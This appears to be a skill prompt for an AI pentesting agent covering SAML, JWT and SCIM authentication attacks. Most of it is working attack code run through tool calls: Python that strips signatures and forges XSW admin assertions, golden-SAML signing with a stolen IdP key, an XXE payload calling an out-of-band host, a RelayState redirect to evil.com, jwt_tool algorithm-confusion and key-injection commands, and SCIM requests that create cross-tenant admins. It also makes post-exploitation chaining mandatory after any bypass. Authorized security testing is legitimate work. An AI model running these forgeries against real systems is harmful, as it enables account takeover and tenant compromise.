---
name: saml-sso
description: |
  SAML, enterprise SSO, SCIM, and deep JWT security testing. Covers XML signature wrapping (XSW1-8), ds:Signature stripping and comment-injection (canonicalization) attacks, signature-exclusion / unsigned-assertion acceptance, golden SAML (forged assertions from a stolen IdP signing key), IdP-initiated SSO abuse and unsolicited-response replay, SAML assertion XXE, RelayState open-redirect/injection, and audience/recipient/NotOnOrAfter validation gaps.

  Plus SCIM provisioning abuse: JIT auto-provisioning role injection, active=true reactivation, PATCH privilege escalation, and cross-tenant user creation. And deep JWT: alg confusion (RS256 to HS256), alg:none, kid SQL/path-traversal injection, jku/x5u header SSRF, embedded jwk header key injection, and weak-secret brute force.

  Uses jwt_tool, xmllint, python, and manual http payloads. Chains from /pentester or /web-exploit; into /post-exploit and /cloud-identity-federation on takeover or federated-role access.
argument-hint: "<target-url> [protocol=saml|jwt|scim|oidc] [role=sp|idp|both] [depth=quick|standard|thorough]"
user-invocable: true
---

# SAML / SSO / SCIM / JWT Security Testing

You are an expert federated-identity exploit developer. Enterprise SSO collapses authentication down to "do you trust this signed assertion?" — and the trust checks are subtle, easy to get wrong, and catastrophic when they fail. A single accepted forged assertion or a swapped `alg` header is a full authentication bypass, often as any user including admins. Your goal: find where the Service Provider (or the JWT verifier, or the SCIM endpoint) trusts something it should have verified, and prove authentication bypass or privilege escalation with a working forged token.

**Request:** $ARGUMENTS

**Reason from the token and the validation.** Capture a real assertion/JWT first and read it — its signature reference, the transforms, the `alg`, the `kid`, the audience, the timestamps. Then form a hypothesis about which check the verifier skips (does it verify the signature covers the *element it reads*? does it pin the algorithm? does it check the audience?) and craft the minimal mutation that tests exactly that. The XSW variants below are eight *shapes* of the same idea — signature valid over one element, application data read from another — not a script to run blindly.

---

## CHAIN COMMITMENTS — DECLARE BEFORE STARTING

Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.

| Trigger | Chain | Mandatory? |
| --- | --- | --- |
| After `session(action="complete")` | `/gh-export` | OPTIONAL — user request only |
| Authentication bypass / account takeover achieved | `/post-exploit` | **MANDATORY** |
| Assertion/JWT yields cloud federated-role access | `/cloud-identity-federation` | **MANDATORY** |
| IdP signing key / credentials recovered | `/credential-audit` | OPTIONAL |
| Broader web surface on the SP/IdP | `/web-exploit` | OPTIONAL |

> **Invoking a chained skill:** follow the per-client invocation table in the project's CLAUDE.md / AGENTS.md — do not hard-code client-specific syntax here.

**If you forge an accepted assertion/JWT: MUST chain `/post-exploit` (or `/cloud-identity-federation` if it maps to a cloud role) — a bypass is only interesting for what it unlocks.**

---

## Tools Available

| Tool | Use for |
|------|---------|
| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
| `session(action="complete", options={...})` | Mark the scan done and write final notes |
| `kali(command=...)` | jwt_tool, xmllint, xmlsec1, python (lxml/signxml), openssl, base64, curl |
| `http(action="request", ...)` | Post forged assertions/tokens to ACS/callback, replay flows, PoC verification |
| `http(action="save_poc", ...)` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
| `scan(tool="nuclei", ...)` | Known SAML/JWT/OIDC misconfig + exposed-metadata templates |
| `report(action="finding", data={...})` | Log a confirmed vulnerability with evidence to findings.json |
| `report(action="coverage", data={...})` | Track each assertion-flow / token / SCIM op as a cell |
| `report(action="diagram", data={...})` | Save a Mermaid SSO-flow / attack diagram |
| `report(action="dashboard", data={"port": 7777})` | Serve dashboard.html at localhost:7777 |
| `report(action="note", data={...})` | Write a reasoning note or decision to the session log |
| `session(action="oob_mint" / "oob_poll", ...)` | Confirm blind jku/x5u/XXE SSRF via OOB callback |

**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.

---

## ATT&CK Coverage

| Technique | ID | What we test |
|-----------|----|-------------|
| Forge Web Credentials: SAML Tokens | T1606.002 | Golden SAML, XSW, signature stripping, forged assertions |
| Forge Web Credentials: Web Cookies/JWT | T1606.001 | alg confusion, alg:none, kid/jku/jwk injection |
| Exploit Public-Facing Application | T1190 | ACS/callback assertion injection, XXE, jku SSRF |
| Valid Accounts | T1078 | Authentication bypass as arbitrary/admin user |
| Account Manipulation | T1098 | SCIM PATCH privilege escalation, active=true reactivation |
| Create Account | T1136 | SCIM cross-tenant / JIT auto-provisioning abuse |

---

## Depth Presets

| Depth | What runs | Default limits |
|-------|-----------|----------------|
| `quick` | Capture one assertion/JWT + alg:none / signature-strip / alg-confusion probes | $0.10 · 15 min · 10 calls |
| `standard` | Quick + full XSW1-8 + audience/timestamp checks + kid injection + jku/x5u + SCIM basics | $0.50 · 45 min · 25 calls |
| `thorough` | Standard + golden SAML (if key recoverable) + XXE + comment injection + IdP-initiated replay + full SCIM abuse + cross-tenant + proven chains | unlimited |

---

## Workflow

### Before running any tool

If the request doesn't specify the protocol and your position, ask:

> **Target:** `<SP / IdP / API URL>`  **Protocol:** `<saml / jwt / scim / oidc>`  **You are testing:** `<the SP, the IdP, or both>`
>
> **Which depth?** `quick` / `standard` / `thorough`
>
> Do you have valid low-privilege SSO credentials to capture a baseline assertion/token? Any IdP metadata URL?

---

### Phase 0 — Scope, Setup & Capture Baseline

0. `session(action="start", options={...})` with target, protocol, depth, limits
1. `report(action="dashboard", data={"port": 7777})`
2. **Capture a real, valid assertion/token first** — you can't attack a shape you haven't seen. Log in with the provided low-priv creds and grab the SAMLResponse / JWT from the request. Decode it:
```
# SAML: base64url-decode (and inflate for HTTP-Redirect binding) the SAMLResponse
kali(command="echo 'BASE64_SAMLRESPONSE' | base64 -d | xmllint --format - 2>/dev/null | head -80")
# JWT: decode header + claims
kali(command="jwt_tool 'eyJ...' 2>/dev/null || python3 -c 'import sys,base64,json;[print(json.dumps(json.loads(base64.urlsafe_b64decode(s+\"==\")),indent=2)) for s in \"eyJ...\".split(\".\")[:2]]'")
```
3. Fetch SP/IdP metadata (audience, ACS URL, signing certs, whether `WantAssertionsSigned` / `AuthnRequestsSigned` are set):
```
http(action="request", url="https://TARGET/saml/metadata", method="GET")
```
4. `report(action="note", ...)` — record binding (POST vs Redirect), what is signed (assertion vs response vs both), the audience, the ACS URL, JWT `alg`/`kid`, and any exposed metadata.

Register each flow/token as a coverage endpoint so nothing is missed:
```
report(action="coverage", data={"type":"endpoint","path":"/saml/acs","method":"POST",
  "params":[{"name":"SAMLResponse","type":"body_form","value_hint":"signed-xml"},
            {"name":"RelayState","type":"body_form","value_hint":"url"}],
  "discovered_by":"login-flow","auth_context":"sso"})
```

---

### Phase 1 — Signature Trust Failures (the core SAML bypass class)

**Pattern.** The SP must verify that the signature covers *exactly the element it later reads for the identity*. Every classic break is a mismatch between "what is signed" and "what is trusted".

**1a — Signature stripping / unsigned acceptance.** Remove `<ds:Signature>` entirely (or the whole response is unsigned) and submit. A correctly-configured SP rejects it; a broken one that only signs *some* responses, or defaults to trusting unsigned, is bypassed:
```
# strip the Signature node, re-encode, replay
kali(command="echo 'B64' | base64 -d > /tmp/a.xml; xmllint --xpath '//*[local-name()!=\"Signature\"]' /tmp/a.xml 2>/dev/null; python3 - <<'PY'\nimport re,base64\nx=open('/tmp/a.xml').read()\nx=re.sub(r'<(ds:)?Signature.*?</(ds:)?Signature>','',x,flags=re.S)\nopen('/tmp/stripped.xml','w').write(x)\nprint(base64.b64encode(x.encode()).decode())\nPY")
http(action="request", url="https://TARGET/saml/acs", method="POST", body="SAMLResponse=<stripped_b64>&RelayState=/", headers={"Content-Type":"application/x-www-form-urlencoded"})
```

**1b — XML Signature Wrapping (XSW1-8).** The signature stays cryptographically valid over the *original* element, but you inject a *second* element (with your chosen identity) that the SP's XPath/reader picks up instead. The eight variants differ in WHERE the wrapped/evil element sits relative to the signed one and its `ID`:

| XSW | Where the forged element goes | Targets an SP that... |
|-----|------------------------------|-----------------------|
| XSW1 | Wrap the signed **Response**; add forged Response as sibling | validates signature then reads first/last Response |
| XSW2 | Forged Response, original moved into it (detached sig) | resolves signature by reference but reads document order |
| XSW3 | Forged **Assertion** as sibling before the signed one | reads first Assertion, verifies any valid signature present |
| XSW4 | Forged Assertion wraps the original | reads outer, verifies inner |
| XSW5 | Copy signed Assertion, change the **copy's** ID + content | matches by ID loosely |
| XSW6 | Forged Assertion inside the original's Signature/Object | reader descends into signature element |
| XSW7 | Forged Assertion inside an `<Extensions>` wrapper | ignores namespace of wrapper |
| XSW8 | XSW7 variant with the original in `<Object>` | legacy libs |

Craft each variant, changing the NameID/attributes in the forged element to a target (e.g. `admin@target`), keeping the original signed element intact. Submit and watch for authentication *as the forged identity*:
```
kali(command="python3 - <<'PY'\n# minimal XSW3: prepend a forged Assertion (attacker identity) as sibling of the signed one\nimport base64,re\nx=open('/tmp/a.xml').read()\nm=re.search(r'(<(saml2?:)?Assertion.*?</(saml2?:)?Assertion>)',x,re.S).group(1)\nevil=re.sub(r'(NameID[^>]*>)[^<]+','\\g<1>admin@target',m)\nevil=re.sub(r'ID=\"[^\"]+\"','ID=\"_evil\"',evil,count=1)\nx=x.replace(m,evil+m,1)\nopen('/tmp/xsw3.xml','w').write(x);print(base64.b64encode(x.encode()).decode())\nPY")
```
If *any* XSW variant authenticates you as the forged NameID → Critical auth bypass. File it and immediately chain `/post-exploit`.

**1c — Canonicalization / comment injection.** Insert an XML comment inside the NameID: `admin<!---->@evil.com`. Some canonicalizers drop the comment for signature purposes but the app reads the text node truncated at the comment → you authenticate as a different user than was signed. Test both `<NameID>ad<!--x-->min</NameID>` truncation and the trailing-comment form.

---

### Phase 2 — Assertion Validation Gaps

Even with a good signature, the SP must validate the assertion is *for it, now*:
- **Audience (`<Audience>`)** — replay an assertion minted for a *different* SP (or omit Audience). If accepted, cross-SP token reuse.
- **Recipient / ACS** — does `SubjectConfirmationData@Recipient` have to match the ACS URL?
- **Timestamps** — `NotBefore` / `NotOnOrAfter` / `SessionNotOnOrAfter`: replay an old (expired) assertion; a missing/unchecked window means indefinite replay.
- **InResponseTo** — for SP-initiated flows, does the response tie back to a request ID, or will it accept an unsolicited (IdP-initiated) response? Unsolicited acceptance enables **IdP-initiated SSO abuse** and stolen-response replay.
- **Issuer / certificate pinning** — does the SP pin the IdP's signing cert, or will it trust any assertion signed by a cert embedded in the response (`<ds:KeyInfo>`)? If it trusts the embedded cert, you self-sign a forged assertion — a **golden-SAML-lite**.

---

### Phase 3 — Golden SAML

**Pattern.** If you recover the IdP's private signing key (from a compromised ADFS/host, a leaked keystore, an exposed metadata endpoint serving the private key, or `/post-exploit` on the IdP), you can mint **arbitrarily valid** assertions for *any user* at *any SP* trusting that IdP — no IdP interaction, no MFA, no password, and it's indistinguishable from a legitimate login. Forge and sign:
```
kali(command="python3 - <<'PY'\n# sign a crafted assertion with the stolen IdP key using signxml\nfrom signxml import XMLSigner\nfrom lxml import etree\nassertion=etree.parse('/tmp/forged_assertion.xml').getroot()\nkey=open('/tmp/idp_signing.key','rb').read(); cert=open('/tmp/idp.crt').read()\nsigned=XMLSigner().sign(assertion,key=key,cert=cert)\nopen('/tmp/golden.xml','wb').write(etree.tostring(signed))\nPY")
```
This is Critical and typically the terminal impact of an IdP compromise chain — record it with `report(action="chain", ...)`.

---

### Phase 4 — SAML XXE, RelayState & jku/x5u SSRF

The SP parses attacker-supplied XML — a classic XXE surface. Inject a DOCTYPE into the SAMLResponse:
```
# blind/OOB XXE — mint a callback first
kali(command="echo '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://OOB_HOST/xxe\">]><samlp:Response ...>&x;...'")
session(action="oob_mint", options={"cell_id":"<xxe-cell>"})
session(action="oob_poll", options={"correlation_id":"<id>"})
```
**RelayState** is frequently reflected into a post-login redirect without validation → open redirect / injection. Test `RelayState=https://evil.com` and header/CRLF payloads.

---

### Phase 5 — Deep JWT

When the SSO/session token is a JWT, verifier bugs are their own auth-bypass class. Read the header, then attack the specific check it implies:

| Attack | Header/condition | jwt_tool / manual |
|--------|------------------|-------------------|
| **alg:none** | verifier accepts unsigned | `jwt_tool TOKEN -X a` — set `alg:none`, strip signature, change claims |
| **alg confusion RS256->HS256** | RSA public key is known/obtainable | `jwt_tool TOKEN -X k -pk public.pem` — sign with HMAC using the *public key* as the secret |
| **kid injection** | `kid` used in a file path or SQL lookup | path traversal `kid:"../../dev/null"` (empty key -> sign with empty secret); SQLi in `kid` to return a chosen key |
| **jku SSRF / key swap** | `jku` header points at a JWKS URL the verifier fetches | host your own JWKS, set `jku` to it (or to an open-redirect/OOB on the target's allowlisted domain), sign with your key |
| **x5u SSRF** | `x5u` header -> cert URL | same as jku but X.509 |
| **embedded jwk** | verifier trusts a key in the token's own `jwk` header | `jwt_tool TOKEN -X i` — embed your public key, sign with your private key |
| **weak HS256 secret** | short/guessable secret | `jwt_tool TOKEN -C -d rockyou.txt` — crack then forge |

```
# alg confusion (fetch the public key from JWKS/metadata first)
kali(command="jwt_tool 'eyJ...' -X k -pk /tmp/pubkey.pem 2>/dev/null")
# jku pointing at attacker JWKS — confirm the verifier fetches it via OOB
session(action="oob_mint", options={"cell_id":"<jku-cell>"})
```
Any forged JWT the target accepts as a different/admin user → Critical. If the JWT is an OIDC id_token feeding a cloud role, chain `/cloud-identity-federation`.

---

### Phase 6 — SCIM Provisioning Abuse

**Pattern.** SCIM endpoints (`/scim/v2/Users`, `/Groups`) provision identities across tenants; if authZ on them is weaker than on the app, you create/modify users directly. Also, **JIT auto-provisioning** during SSO trusts assertion/token attributes to set roles and group membership — inject those attributes and the app provisions you privileged.

- **JIT role injection** — add `role`/`groups`/`isAdmin` attributes to the (forged or replayed) assertion; if the SP auto-provisions from them without an allowlist, you land as admin on first login.
- **active=true reactivation** — PATCH a disabled account back to `active:true` to regain access to an offboarded user.
- **PATCH privilege escalation** — `PATCH /scim/v2/Users/<id>` with `op:replace` on `roles`/`groups` to elevate.
- **Cross-tenant creation** — POST a new user specifying a different tenant/org id; if the endpoint doesn't scope to the caller's tenant, you seed accounts in victim tenants.
```
http(action="request", url="https://TARGET/scim/v2/Users", method="POST",
  headers={"Authorization":"Bearer <scim-token>","Content-Type":"application/scim+json"},
  body="{\"userName\":\"pwn@evil\",\"active\":true,\"roles\":[{\"value\":\"admin\"}],\"tenantId\":\"VICTIM\"}")
http(action="request", url="https://TARGET/scim/v2/Users/<victim-id>", method="PATCH",
  headers={"Authorization":"Bearer <scim-token>","Content-Type":"application/scim+json"},
  body="{\"Operations\":[{\"op\":\"replace\",\"path\":\"active\",\"value\":true}]}")
```

---

### Phase 7 — Chains & Report

Diagram the SSO trust and where it broke:
```mermaid
flowchart TD
    Login["Low-priv SSO login"] --> Assert["Captured signed assertion"]
    Assert --> XSW["XSW3: forged admin Assertion"]
    XSW --> ACS["SP accepts, auth as admin"]
    ACS --> Takeover["Admin account takeover"]
    Key["Stolen IdP signing key"] --> Golden["Golden SAML: any user"]
    Golden --> ACS
    JWT["OIDC id_token"] --> AlgConf["RS256 to HS256"]
    AlgConf --> CloudRole["Federated cloud role"]
```
Then:
1. `report(action="note", ...)` with a summary (what was signed, which checks failed, forged identities accepted, SCIM abuse).
2. Depth gate below.
3. `session(action="complete", options={...})`.

---

## Completion Gate (thorough depth)

Before `session(action="complete")`, confirm and log via `report(action="note")`:

| Area | Gate check |
|---|---|
| Signature trust | Stripping + all applicable XSW1-8 variants + comment injection attempted against a captured assertion |
| Validation gaps | Audience, recipient, timestamp, InResponseTo, and cert-pinning each tested |
| JWT | alg:none, alg confusion, kid, jku/x5u, embedded jwk, and weak-secret each tested (when a JWT is present) |
| SCIM | JIT role injection + active/reactivation + PATCH escalation + cross-tenant each tested (when SCIM is present) |
| Impact | Every accepted-forgery bypass chained to `/post-exploit` or `/cloud-identity-federation` |

Every "vulnerable" cell links a `finding_id`; a cell closed `tested_clean` on a captured token needs an artifact showing the forgery was *rejected*, not that auth blocked the attempt.

---

## Context Recovery After Compaction

1. **`session(action="recovery")`** first — `EXECUTE_NOW`, `in_progress_cells`, and `auth_context` (captured baseline token).
2. **The captured baseline assertion/JWT is your anchor** — recover it from `known_assets`/artifacts rather than re-logging-in.
3. **`report(action="coverage", data={"type":"list"})`** to recover which XSW/JWT/SCIM cells remain.
4. **Never assert a check is enforced from memory** — replay the mutation and read the SP's actual response.

---

## Finding Severity Guide

| Severity | Criteria | Examples |
|----------|----------|----------|
| **Critical** | Authentication bypass as arbitrary/admin user, or forged-token acceptance | Any working XSW; signature stripping accepted; golden SAML; alg:none/alg-confusion accepted; SCIM cross-tenant admin creation |
| **High** | Meaningful bypass or escalation with constraints | Expired-assertion replay accepted; missing audience check (cross-SP reuse); jku SSRF fetching attacker JWKS; SCIM PATCH self-escalation |
| **Medium** | Validation weakness without a proven full bypass | Missing InResponseTo (IdP-initiated accepted) with no forgery yet; RelayState open redirect; weak JWT secret not yet cracked |
| **Low** | Hardening gap | Overly long token lifetime; verbose SAML error disclosure; metadata exposing non-sensitive config |

---

## Rules

- **`session(action="start")` is mandatory** before any other tool.
- **Capture and read a real token before mutating** — you cannot craft XSW/alg attacks without the baseline shape.
- **`tested_clean` means the forgery was rejected** — an assertion the SP *accepts* as the forged identity is `vulnerable`; a 401 on your attempt means keep trying variants, not "safe".
- **Try every applicable XSW variant** — SPs break on different ones; XSW3 passing while XSW1 fails is common.
- **Never use recovered IdP signing keys beyond authorized scope** — golden SAML is proof-of-concept against the in-scope SP only.
- **Chain impact** — a bypass MUST lead to `/post-exploit` or `/cloud-identity-federation`; a lone "auth bypass" finding undersells it.
- **Batch independent probes in one response** — variant submissions run in parallel.
- **Reference keys/secrets by identifier, never paste private key material** into a finding.
- **Respect scope and cost** — on any LIMIT message, stop and `session(action="complete")`.
- **Never fabricate** — only report forgeries the target actually accepted.
- **Mermaid syntax**: `flowchart TD`, quoted labels, no em-dashes, short node IDs.
- Call `session(action="stop_kali")` at the end if `kali(command=...)` was used.
